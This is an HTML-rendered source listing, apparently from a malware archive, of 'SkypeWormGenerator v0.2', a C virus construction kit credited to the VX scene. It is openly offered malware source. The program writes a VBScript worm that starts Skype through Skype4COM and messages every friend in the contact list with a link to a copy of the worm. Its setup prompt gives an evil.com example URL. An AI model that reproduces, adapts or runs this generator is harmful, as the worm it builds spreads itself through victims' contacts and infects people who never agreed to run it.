<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>Trojan.Win32.Agent.ago - skwg_02.c.html</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc3 {
	color: #008080;
}
.sc4 {
	color: #FF8000;
}
.sc5 {
	font-weight: bold;
	color: #0000FF;
}
.sc6 {
	color: #808080;
}
.sc9 {
	color: #804000;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
.sc11 {
}
.sc16 {
	color: #8000FF;
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc3">/*********************************************************************
 * SkypeWormGenerator v0.2 by [WarGame/doomriderz]                   *
 * This VCK can generate worm spreading using skype IM               *
 * greetz to: izee, SlageHammer, sk0r, Nibble, free0n and everybody  *
 * in VX scene                                                       *
 * This console proggy makes me remember TurboC :) on my old i386    *
 * Music: "Anarchy in UK"                                            *
 * TODO: Next version will have a GUI and more functions :)          *
 *********************************************************************/</span><span class="sc0">

</span><span class="sc9">#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
</span><span class="sc0">
</span><span class="sc16">void</span><span class="sc0"> </span><span class="sc11">GenerateWorm</span><span class="sc10">(</span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">name</span><span class="sc10">,</span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">author</span><span class="sc10">,</span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">url</span><span class="sc10">,</span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">out</span><span class="sc10">)</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">rand_chars</span><span class="sc10">[]</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc6">"KlouAsFNyrxZV"</span><span class="sc10">};</span><span class="sc0">
    </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">skype_obj</span><span class="sc10">[</span><span class="sc4">5</span><span class="sc10">];</span><span class="sc0">
    </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">user_obj</span><span class="sc10">[</span><span class="sc4">3</span><span class="sc10">];</span><span class="sc0">
    </span><span class="sc11">FILE</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">fd</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc10">;</span><span class="sc0">

    </span><span class="sc11">srand</span><span class="sc10">(</span><span class="sc11">time</span><span class="sc10">(</span><span class="sc5">NULL</span><span class="sc10">));</span><span class="sc0">

    </span><span class="sc11">sprintf</span><span class="sc10">(</span><span class="sc11">skype_obj</span><span class="sc10">,</span><span class="sc6">"%c%c%c%c%c"</span><span class="sc10">,</span><span class="sc11">rand_chars</span><span class="sc10">[</span><span class="sc11">rand</span><span class="sc10">()%</span><span class="sc4">13</span><span class="sc10">],</span><span class="sc11">rand_chars</span><span class="sc10">[</span><span class="sc11">rand</span><span class="sc10">()%</span><span class="sc4">13</span><span class="sc10">],</span><span class="sc11">rand_chars</span><span class="sc10">[</span><span class="sc11">rand</span><span class="sc10">()%</span><span class="sc4">13</span><span class="sc10">],</span><span class="sc0">
        </span><span class="sc11">rand_chars</span><span class="sc10">[</span><span class="sc11">rand</span><span class="sc10">()%</span><span class="sc4">13</span><span class="sc10">],</span><span class="sc11">rand_chars</span><span class="sc10">[</span><span class="sc11">rand</span><span class="sc10">()%</span><span class="sc4">13</span><span class="sc10">]);</span><span class="sc0">

    </span><span class="sc5">if</span><span class="sc10">((</span><span class="sc11">fd</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">fopen</span><span class="sc10">(</span><span class="sc11">out</span><span class="sc10">,</span><span class="sc6">"a+"</span><span class="sc10">))</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc10">)</span><span class="sc0">
    </span><span class="sc10">{</span><span class="sc0">
        </span><span class="sc11">printf</span><span class="sc10">(</span><span class="sc6">"I could not create the output file !\n"</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc5">return</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc10">}</span><span class="sc0">

    </span><span class="sc11">fprintf</span><span class="sc10">(</span><span class="sc11">fd</span><span class="sc10">,</span><span class="sc6">"' generated by SkWG\n"</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">fprintf</span><span class="sc10">(</span><span class="sc11">fd</span><span class="sc10">,</span><span class="sc6">"on error resume next\n"</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">fprintf</span><span class="sc10">(</span><span class="sc11">fd</span><span class="sc10">,</span><span class="sc6">"set %s = WScript.CreateObject(\"Skype4COM.Skype\", \"Skype_\")\n"</span><span class="sc10">,</span><span class="sc11">skype_obj</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">fprintf</span><span class="sc10">(</span><span class="sc11">fd</span><span class="sc10">,</span><span class="sc6">"%s.Client.Start()\n"</span><span class="sc10">,</span><span class="sc11">skype_obj</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">fprintf</span><span class="sc10">(</span><span class="sc11">fd</span><span class="sc10">,</span><span class="sc6">"%s.Attach()\n"</span><span class="sc10">,</span><span class="sc11">skype_obj</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">sprintf</span><span class="sc10">(</span><span class="sc11">user_obj</span><span class="sc10">,</span><span class="sc6">"%c%c%c"</span><span class="sc10">,</span><span class="sc11">rand_chars</span><span class="sc10">[</span><span class="sc11">rand</span><span class="sc10">()%</span><span class="sc4">13</span><span class="sc10">],</span><span class="sc11">rand_chars</span><span class="sc10">[</span><span class="sc11">rand</span><span class="sc10">()%</span><span class="sc4">13</span><span class="sc10">],</span><span class="sc11">rand_chars</span><span class="sc10">[</span><span class="sc11">rand</span><span class="sc10">()%</span><span class="sc4">13</span><span class="sc10">]);</span><span class="sc0">
    </span><span class="sc11">fprintf</span><span class="sc10">(</span><span class="sc11">fd</span><span class="sc10">,</span><span class="sc6">"For Each %s In %s.Friends\n"</span><span class="sc10">,</span><span class="sc11">user_obj</span><span class="sc10">,</span><span class="sc11">skype_obj</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">fprintf</span><span class="sc10">(</span><span class="sc11">fd</span><span class="sc10">,</span><span class="sc6">"%s.SendMessage %s.handle,\"%s\"\n"</span><span class="sc10">,</span><span class="sc11">skype_obj</span><span class="sc10">,</span><span class="sc11">user_obj</span><span class="sc10">,</span><span class="sc11">url</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">fprintf</span><span class="sc10">(</span><span class="sc11">fd</span><span class="sc10">,</span><span class="sc6">"next\n"</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">fprintf</span><span class="sc10">(</span><span class="sc11">fd</span><span class="sc10">,</span><span class="sc6">"msgbox \"%s by %s\",,\"%s is here\"\n"</span><span class="sc10">,</span><span class="sc11">name</span><span class="sc10">,</span><span class="sc11">author</span><span class="sc10">,</span><span class="sc11">name</span><span class="sc10">);</span><span class="sc0">

    </span><span class="sc11">fclose</span><span class="sc10">(</span><span class="sc11">fd</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">printf</span><span class="sc10">(</span><span class="sc6">"Written!\n"</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc5">return</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">

</span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">main</span><span class="sc10">(</span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">argc</span><span class="sc10">,</span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">argv</span><span class="sc10">[])</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">prompt_s</span><span class="sc10">[</span><span class="sc4">32</span><span class="sc10">];</span><span class="sc0">
    </span><span class="sc16">short</span><span class="sc0"> </span><span class="sc11">prompt</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">worm_url</span><span class="sc10">[</span><span class="sc4">256</span><span class="sc10">];</span><span class="sc0"> </span><span class="sc1">/* it should be big enough */</span><span class="sc0">
    </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">worm_name</span><span class="sc10">[</span><span class="sc4">30</span><span class="sc10">];</span><span class="sc0"> </span><span class="sc1">/* the name of the worm */</span><span class="sc0">
    </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">worm_author</span><span class="sc10">[</span><span class="sc4">30</span><span class="sc10">];</span><span class="sc0"> </span><span class="sc1">/* the name of the author */</span><span class="sc0">
    </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">out</span><span class="sc10">[</span><span class="sc4">256</span><span class="sc10">];</span><span class="sc0">

    </span><span class="sc11">printf</span><span class="sc10">(</span><span class="sc6">"SkWG v0.2 - SkypeWormGenerator by [WarGame/doomriderz]\n"</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">printf</span><span class="sc10">(</span><span class="sc6">"Press CTRL-C or CTRL-Z or use 3 to exit\n"</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">printf</span><span class="sc10">(</span><span class="sc6">"Options:\n"</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">printf</span><span class="sc10">(</span><span class="sc6">"[1] - Generate a worm\n"</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">printf</span><span class="sc10">(</span><span class="sc6">"[2] - Info about this VCK\n"</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">printf</span><span class="sc10">(</span><span class="sc6">"[3] - Exit\n"</span><span class="sc10">);</span><span class="sc0">

    </span><span class="sc5">for</span><span class="sc10">(;</span><span class="sc4">1</span><span class="sc10">;)</span><span class="sc0">
    </span><span class="sc10">{</span><span class="sc0">
        </span><span class="sc11">prompt</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">

        </span><span class="sc5">while</span><span class="sc10">(</span><span class="sc11">prompt</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc4">1</span><span class="sc0"> </span><span class="sc10">&amp;&amp;</span><span class="sc0"> </span><span class="sc11">prompt</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc4">2</span><span class="sc0"> </span><span class="sc10">&amp;&amp;</span><span class="sc0"> </span><span class="sc11">prompt</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc4">3</span><span class="sc10">)</span><span class="sc0">
        </span><span class="sc10">{</span><span class="sc0">
            </span><span class="sc11">printf</span><span class="sc10">(</span><span class="sc6">"&gt;"</span><span class="sc10">);</span><span class="sc0">
            </span><span class="sc11">scanf</span><span class="sc10">(</span><span class="sc6">"%s"</span><span class="sc10">,</span><span class="sc11">prompt_s</span><span class="sc10">);</span><span class="sc0">
            </span><span class="sc11">prompt</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">atoi</span><span class="sc10">(</span><span class="sc11">prompt_s</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc10">}</span><span class="sc0">

        </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">prompt</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc4">1</span><span class="sc10">)</span><span class="sc0">
        </span><span class="sc10">{</span><span class="sc0">
            </span><span class="sc11">printf</span><span class="sc10">(</span><span class="sc6">"Worm generation setup\n"</span><span class="sc10">);</span><span class="sc0">
            </span><span class="sc11">printf</span><span class="sc10">(</span><span class="sc6">"----------------------------------------------\n"</span><span class="sc10">);</span><span class="sc0">
            </span><span class="sc11">printf</span><span class="sc10">(</span><span class="sc6">"You need to insert the following infos:\n"</span><span class="sc10">);</span><span class="sc0">
            </span><span class="sc11">printf</span><span class="sc10">(</span><span class="sc6">"Worm name - the name of the worm\n"</span><span class="sc10">);</span><span class="sc0">
            </span><span class="sc11">printf</span><span class="sc10">(</span><span class="sc6">"Worm author - the name of the author of the beast\n"</span><span class="sc10">);</span><span class="sc0">
            </span><span class="sc11">printf</span><span class="sc10">(</span><span class="sc6">"Worm url&amp;msg - the url&amp;msg that the worm uses in IM messages (like: Check this! http://www.evil.com/copyoftheworm.vbs)\n"</span><span class="sc10">);</span><span class="sc0">
            </span><span class="sc11">printf</span><span class="sc10">(</span><span class="sc6">"Output - the file where to write the worm (it should be something.vbs)\n"</span><span class="sc10">);</span><span class="sc0">
            </span><span class="sc11">printf</span><span class="sc10">(</span><span class="sc6">"----------------------------------------------\n"</span><span class="sc10">);</span><span class="sc0">
            </span><span class="sc11">printf</span><span class="sc10">(</span><span class="sc6">"Worm name:"</span><span class="sc10">);</span><span class="sc0">
            </span><span class="sc11">gets</span><span class="sc10">(</span><span class="sc11">worm_name</span><span class="sc10">);</span><span class="sc0">
            </span><span class="sc11">gets</span><span class="sc10">(</span><span class="sc11">worm_name</span><span class="sc10">);</span><span class="sc0">
            </span><span class="sc11">printf</span><span class="sc10">(</span><span class="sc6">"Worm author:"</span><span class="sc10">);</span><span class="sc0">
            </span><span class="sc11">gets</span><span class="sc10">(</span><span class="sc11">worm_author</span><span class="sc10">);</span><span class="sc0">
            </span><span class="sc11">printf</span><span class="sc10">(</span><span class="sc6">"Output:"</span><span class="sc10">);</span><span class="sc0">
            </span><span class="sc11">gets</span><span class="sc10">(</span><span class="sc11">out</span><span class="sc10">);</span><span class="sc0">
            </span><span class="sc11">printf</span><span class="sc10">(</span><span class="sc6">"Worm url and msg:"</span><span class="sc10">);</span><span class="sc0">
            </span><span class="sc11">gets</span><span class="sc10">(</span><span class="sc11">worm_url</span><span class="sc10">);</span><span class="sc0">
            </span><span class="sc11">GenerateWorm</span><span class="sc10">(</span><span class="sc11">worm_name</span><span class="sc10">,</span><span class="sc11">worm_author</span><span class="sc10">,</span><span class="sc11">worm_url</span><span class="sc10">,</span><span class="sc11">out</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc10">}</span><span class="sc0">

        </span><span class="sc5">else</span><span class="sc0"> </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">prompt</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc4">2</span><span class="sc10">)</span><span class="sc0">
        </span><span class="sc10">{</span><span class="sc0">
            </span><span class="sc11">printf</span><span class="sc10">(</span><span class="sc6">"SkWG v0.2 by [WarGame/doomriderz]\n"</span><span class="sc10">);</span><span class="sc0">
            </span><span class="sc11">printf</span><span class="sc10">(</span><span class="sc6">"This is a VCK that can be used to create simple worms\n"</span><span class="sc10">);</span><span class="sc0">
            </span><span class="sc11">printf</span><span class="sc10">(</span><span class="sc6">"spreading using Skype IM\n"</span><span class="sc10">);</span><span class="sc0">
            </span><span class="sc11">printf</span><span class="sc10">(</span><span class="sc6">"For suggestions or bug notifications: wargame89@yahoo.it\n"</span><span class="sc10">);</span><span class="sc0">
            </span><span class="sc11">printf</span><span class="sc10">(</span><span class="sc6">"On Web: http://doomriderz.co.nr or my home: http://ihateyou.altervista.org\n"</span><span class="sc10">);</span><span class="sc0">
            </span><span class="sc11">printf</span><span class="sc10">(</span><span class="sc6">"Press any key to continue\n"</span><span class="sc10">);</span><span class="sc0">
            </span><span class="sc11">getch</span><span class="sc10">();</span><span class="sc0">
        </span><span class="sc10">}</span><span class="sc0">

        </span><span class="sc5">else</span><span class="sc0">
        </span><span class="sc10">{</span><span class="sc0">
            </span><span class="sc11">exit</span><span class="sc10">(</span><span class="sc4">0</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc10">}</span><span class="sc0">
    </span><span class="sc10">}</span><span class="sc0">
</span><span class="sc10">}</span></div></body>
</html>
